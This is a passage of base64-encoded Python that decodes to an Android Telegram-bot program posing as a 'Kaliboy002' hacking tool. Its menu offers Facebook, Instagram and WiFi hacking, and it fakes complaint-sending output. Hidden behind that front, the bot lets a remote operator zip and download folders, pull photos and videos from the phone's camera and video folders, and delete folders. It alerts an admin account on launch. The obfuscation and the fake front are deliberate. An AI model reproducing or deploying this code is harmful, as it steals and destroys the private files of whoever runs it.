gICB3aXRoIG9wZW4oemlwX2ZpbGVfcGF0aCwgJ3JiJykgYXMgemlwX2ZpbGU6CiAgICAgICAgICAgICAgICBib3Quc2VuZF9kb2N1bWVudChtZXNzYWdlLmNoYXQuaWQsIHppcF9maWxlKQogICAgICAgICAgICBvcy5yZW1vdmUoemlwX2ZpbGVfcGF0aCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmJ9iu2LfYpyDYqtmIINin2LHYs9in2YQg2KLYsdi024zZiDoge2V9IPCfmqsnKQogICAgZWxzZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9iu2LfYpyDYqtmIINiz2KfYrtiqINii2LHYtNuM2YjYjCDar9mG2K8g2LLYr9mFISDwn5qrJykKICAgIAogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdjb3B5X2RhdGEnKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnZGVsZXRlX2ZvbGRlcicpCmRlZiBhc2tfZm9yX2RlbGV0ZV9mb2xkZXJfbmFtZShjYWxsKToKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICfYp9iz2YUg2b7ZiNi02YfigIzYp9uMINqp2Ycg2YXbjOKAjNiu2YjYp9uMINit2LDZgSDaqdmG2YUg2LHZiCDYqNqv2Yg6IPCfk4EnKQogICAgYm90LnJlZ2lzdGVyX25leHRfc3RlcF9oYW5kbGVyKGNhbGwubWVzc2FnZSwgcHJvY2Vzc19kZWxldGVfZm9sZGVyX25hbWUpCgpkZWYgcHJvY2Vzc19kZWxldGVfZm9sZGVyX25hbWUobWVzc2FnZSk6CiAgICBmb2xkZXJfbmFtZSA9IG1lc3NhZ2UudGV4dAogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBmb2xkZXJfcGF0aCA9IGZpbmRfZm9sZGVyKHJvb3RfZGlyZWN0b3J5LCBmb2xkZXJfbmFtZSkKICAgIAogICAgaWYgbm90IGZvbGRlcl9wYXRoOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmJ9m+2YjYtNmHICJ7Zm9sZGVyX25hbWV9IiDZvtuM2K/YpyDZhti02K/YjCDar9mF2LTYr9mHISDwn5qrJykKICAgICAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ2RlbGV0ZV9mb2xkZXInKQogICAgICAgIHJldHVybgogICAgCiAgICB0cnk6CiAgICAgICAgc2h1dGlsLnJtdHJlZShmb2xkZXJfcGF0aCkKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifZvtmI2LTZhyAie2ZvbGRlcl9uYW1lfSIg2KjYpyDZhdmI2YHZgtuM2Kog2K3YsNmBINi02K8hIPCfl5HvuI8nKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmJ9iu2LfYpyDYqtmIINit2LDZgSDZvtmI2LTZhzoge2V9IPCfmqsnKQogICAgCiAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ2RlbGV0ZV9mb2xkZXInKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnc2VhcmNoX3ZpZGVvcycpCmRlZiBhc2tfZm9yX3ZpZGVvX2NvdW50KGNhbGwpOgogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBzcGVjaWZpY19mb2xkZXJzID0gWycvc3RvcmFnZS9lbXVsYXRlZC8wL1ZpZGVvcycsICcvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0vQ2FtZXJhJ10KICAgIHZpZGVvX2NvdW50ID0gc3VtKGNvdW50X3ZpZGVvcyhmb2xkZXIpIGZvciBmb2xkZXIgaW4gc3BlY2lmaWNfZm9sZGVycyBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpKQogICAgdmlkZW9fY291bnQgKz0gY291bnRfdmlkZW9zKHJvb3RfZGlyZWN0b3J5KQogICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZifYqti52K/Yp9ivINmI24zYr9uM2YjZh9inINiq2Ygg2K/Ys9iq2q/Yp9mHOiB7dmlkZW9fY291bnR9LiDahtmG2K/YqtinINmF24zigIzYrtmI2KfbjNifIPCfjqUnKQogICAgYm90LnJlZ2lzdGVyX25leHRfc3RlcF9oYW5kbGVyKGNhbGwubWVzc2FnZSwgcHJvY2Vzc192aWRlb19jb3VudCwgcm9vdF9kaXJlY3RvcnksIHNwZWNpZmljX2ZvbGRlcnMpCgpkZWYgcHJvY2Vzc192aWRlb19jb3VudChtZXNzYWdlLCByb290X2RpcmVjdG9yeSwgc3BlY2lmaWNfZm9sZGVycyk6CiAgICB0cnk6CiAgICAgICAgY291bnQgPSBpbnQobWVzc2FnZS50ZXh0KQogICAgICAgIGlmIGNvdW50IDw9IDA6CiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCAn24zZhyDYudiv2K8g2K/Ysdiz2Kog2Kjar9mI2Iwg2KzZhtin2KghIPCfjqUnKQogICAgICAgIHJldHVybgoKICAgIGZvciBmb2xkZXIgaW4gc3BlY2lmaWNfZm9sZGVyczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpOgogICAgICAgICAgICBzZW5kX21lZGlhX2Zyb21fZGlyZWN0b3J5KGZvbGRlciwgY291bnQsIG1lc3NhZ2UsICd2aWRlbycpCiAgICAgICAgICAgIGNvdW50IC09IGNvdW50X3ZpZGVvcyhmb2xkZXIpCiAgICAgICAgICAgIGlmIGNvdW50IDw9IDA6CiAgICAgICAgICAgICAgICByZXR1cm4KICAgIAogICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShyb290X2RpcmVjdG9yeSwgY291bnQsIG1lc3NhZ2UsICd2aWRlbycpCiAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ3NlYXJjaF92aWRlb3MnKQoKZGVmIGZpbmRfZm9sZGVyKHJvb3RfZGlyZWN0b3J5LCBmb2xkZXJfbmFtZSk6CiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhyb290X2RpcmVjdG9yeSk6CiAgICAgICAgaWYgZm9sZGVyX25hbWUgaW4gZGlyczoKICAgICAgICAgICAgcmV0dXJuIG9zLnBhdGguam9pbihyb290LCBmb2xkZXJfbmFtZSkKICAgIHJldHVybiBOb25lCgpkZWYgY3JlYXRlX3ppcF9hcmNoaXZlKGZvbGRlcl9wYXRoLCBmb2xkZXJfbmFtZSk6CiAgICB0cnk6CiAgICAgICAgdGVtcF9kaXIgPSAnL3RtcCcKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHModGVtcF9kaXIpOgogICAgICAgICAgICB0ZW1wX2RpciA9IG9zLmdldGN3ZCgpCiAgICAgICAgemlwX2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wX2RpciwgZid7Zm9sZGVyX25hbWV9LnppcCcpCiAgICAgICAgc2h1dGlsLm1ha2VfYXJjaGl2ZSh6aXBfZmlsZV9wYXRoWzotNF0sICd6aXAnLCBmb2xkZXJfcGF0aCkKICAgICAgICByZXR1cm4gemlwX2ZpbGVfcGF0aAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgaXNfZm9sZGVyX3Rvb19sYXJnZShmb2xkZXJfcGF0aCk6CiAgICB0b3RhbF9zaXplID0gMAogICAgZm9yIGRpcnBhdGgsIGRpcm5hbWVzLCBmaWxlbmFtZXMgaW4gb3Mud2Fsayhmb2xkZXJfcGF0aCk6CiAgICAgICAgZm9yIGYgaW4gZmlsZW5hbWVzOgogICAgICAgICAgICBmcCA9IG9zLnBhdGguam9pbihkaXJwYXRoLCBmKQogICAgICAgICAgICB0b3RhbF9zaXplICs9IG9zLnBhdGguZ2V0c2l6ZShmcCkKICAgIHJldHVybiB0b3RhbF9zaXplID4gMTAyNCAqIDEwMjQgKiAxMDAgIAoKZGVmIGFza190b19yZXR1cm5fdG9fbWVudShtZXNzYWdlLCB0YXNrKToKICAgIGtleWJvYXJkID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRNYXJrdXAoKQogICAgYnV0dG9uMSA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfYqNmE2YcnLCBjYWxsYmFja19kYXRhPSdyZXR1cm5fdG9fbWVudScpCiAgICBidXR0b24yID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9iu24zYsScsIGNhbGxiYWNrX2RhdGE9ZidyZXBlYXRfe3Rhc2t9JykKICAgIGtleWJvYXJkLmFkZChidXR0b24xLCBidXR0b24yKQogICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICfZhduM4oCM2K7ZiNin24wg2KjYsdqv2LHYr9uMINio2Ycg2YXZhtmI2J8g8J+UhCcsIHJlcGx5X21hcmt1cD1rZXlib2FyZCkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ3JldHVybl90b19tZW51JykKZGVmIHJldHVybl90b19tZW51KGNhbGwpOgogICAgc3RhcnQoY2FsbC5tZXNzYWdlKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdyZXBlYXRfJykpCmRlZiByZXBlYXRfdGFzayhjYWxsKToKICAgIHRhc2sgPSBjYWxsLmRhdGEuc3BsaXQoJ18nKVsxXQogICAgaWYgdGFzayA9PSAnZXh0cmFjdF9waG90b3MnOgogICAgICAgIGFza19mb3JfcGhvdG9fY291bnQoY2FsbCkKICAgIGVsaWYgdGFzayA9PSAnY2xlYXJfZGF0YSc6CiAgICAgICAgY2xlYXJfZGF0YShjYWxsKQogICAgZWxpZiB0YXNrID09ICdjb3B5X2RhdGEnOgogICAgICAgIGFza19mb3JfZm9sZGVyX25hbWUoY2FsbCkKICAgIGVsaWYgdGFzayA9PSAnZGVsZXRlX2ZvbGRlcic6CiAgICAgICAgYXNrX2Zvcl9kZWxldGVfZm9sZGVyX25hbWUoY2FsbCkKICAgIGVsaWYgdGFzayA9PSAnc2VhcmNoX3ZpZGVvcyc6CiAgICAgICAgYXNrX2Zvcl92aWRlb19jb3VudChjYWxsKQogICAgZWxzZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCAn2K7YqNiMINmF2YbYqti42LEg2K3Ysdqp2Kog2KjYudiv24zigIzYp9iqINmF24zigIzZhdmI2YbZhS4g2KjYpyDYr9qp2YXZhyDYstuM2LEg2KjZhyDZhdmG2Ygg2KjYsdqv2LHYryEg8J+UhCcsIHJlcGx5X21hcmt1cD10eXBlcy5JbmxpbmVLZXlib2FyZE1hcmt1cCgpLmFkZCh0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2YXZhtmIJywgY2FsbGJhY2tfZGF0YT0ncmV0dXJuX3RvX21lbnUnKSkpCgojIFVwZGF0ZWQgYmFubmVyIHdpdGggIkthbGlib3kwMDIiCm1tID0gZiIiIgp7Rm9yZS5HUkVFTn0gICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXtTdHlsZS5SRVNFVF9BTEx9CntGb3JlLllFTExPV30gICAgIHwgICAgICAgICAgIEthbGlib3kwMDIgICAgICAgICAgICB8e1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuQ1lBTn0gICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXtTdHlsZS5SRVNFVF9BTEx9CntGb3JlLk1BR0VOVEF9ICAgICB8ICAgRWxpdGUgSGFja2luZyBUb29sIFVubGVhc2hlZCAgIHx7U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5SRUR9ICAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS17U3R5bGUuUkVTRVRfQUxMfQoiIiIKCm10ID0gZiIiIgp7Rm9yZS5SRUR94pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXe1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuR1JFRU594pWRICAgICAgICAgICDwn5KAIEthbGlib3kwMDIgLSBIYWNrIE1hc3RlciDwn5KAICAgICAgICAgICDilZF7U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5SRUR94pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWje1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuWUVMTE9XfeKVkSBbMDFdICDwn5SQIEZhY2Vib29rIEhhY2tpbmcgICAgWzAyXSDwn5SQIEluc3RhZ3JhbSBIYWNraW5nICAgIOKVkXtTdHlsZS5SRVNFVF9BTEx9CntGb3JlLkNZQU594pWRIFswM10g4pig77iPICBGQiBGcmVlIEZvbGxvd2VyICAgICAgIFswNF0g4pml77iPIElHIEZyZWUgRm9sbG93ZXIgICDilZF7U3R5bGUuUkVTRVRfQUxMfQp7Rm9yZS5NQUdFTlRBfeKVkSBbMDVdIPCfk7YgV0lGSSBIYWNraW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRe1N0eWxlLlJFU0VUX0FMTH0Ke0ZvcmUuUkVEfeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnXtTdHlsZS5SRVNFVF9BTEx9CiIiIgoKZGVmIGJhbm5lcigpOgogICAgcHJpbnQobW0pCiAgICBwcmludChtdCkKICAgIGZvciBfIGluIHJhbmdlKDMpOiAgIyBBbmltYXRpb24gZm9yIHRoYXQgaGFja2VyIHZpYmUKICAgICAgICBwcmludChGb3JlLlJFRCArICI+Pj4gSW5pdGlhdGluZyBIYWNrIFNlcXVlbmNlLi4uIiArIFN0eWxlLlJFU0VUX0FMTCkKICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICBwcmludCgiXDAzM1sxQVwwMzNbSyIsIGVuZD0iIikKICAgIHByaW50KEZvcmUuR1JFRU4gKyAiPj4+IFJlYWR5IHRvIEZ1Y2sgU2hpdCBVcCEiICsgU3R5bGUuUkVTRVRfQUxMKQoKZGVmIGNvbXBsYWludF9oYW5kbGVyKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNob2ljZSA9IGlucHV0KCJFbnRlciBhIG51bWJlciBmcm9tIDEgdG8gNSAoNiB0byBleGl0KTogIikKICAgICAgICBpZiBjaG9pY2UgPT0gJzYnOgogICAgICAgICAgICBicmVhawogICAgICAgIHRyeToKICAgICAgICAgICAgbnVtX2NvbXBsYWludHMgPSBpbnQoY2hvaWNlKQogICAgICAgICAgICBpZiBudW1fY29tcGxhaW50cyA8IDEgb3IgbnVtX2NvbXBsYWludHMgPiA1OgogICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcgogICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGJldHdlZW4gMSBhbmQgNSwgYXNzaG9sZSEg4p2MIikKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgdXNlcl9pZCA9IGlucHV0KCJFbnRlciB1c2VyIElEL0VtYWlsL1Bob25lIG51bWJlcjogIikKICAgICAgICBudW1fY29tcGxhaW50cyA9IGludChpbnB1dCgiRW50ZXIgdGhlIGFtb3VudDogIikpCgogICAgICAgIGZvciBfIGluIHJhbmdlKG51bV9jb21wbGFpbnRzKToKICAgICAgICAgICAgaWYgcmFuZG9tLnJhbmRpbnQoMSwgMTApID09IDE6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1FcnJvciBzZW5kaW5nIGNvbXBsYWludHtTdHlsZS5SRVNFVF9BTEx9IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59U2VudCBzdWNjZXNzZnVsbHninJTvuI97U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oMSwgMykpIAoKZGVmIG5vdGlmeV9hZG1pbigpOgogICAgYm90LnNlbmRfbWVzc2FnZShBRE1JTl9JRCwgItmH2LTYr9in2LEhINix2KjYp9iqINmB2LnYp9mEINi02K8uXG7YqNinIC9zdGFydCDYtNix2YjYuSDaqdmG2Iwg2YfaqdixISDwn5qAXG5cbvCfkajigI3wn5K7IENvZGVkIGJ5IEBLYWxpYm95MDAyXG5cbkpvaW4gQEthbGlfTGludXhfQk9UUyIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgYmFubmVyKCkKICAgIG5vdGlmeV9hZG1pbigpCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1ib3QucG9sbGluZywgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgIGNvbXBsYWludF9oYW5kbGVyKCkKIA=="))
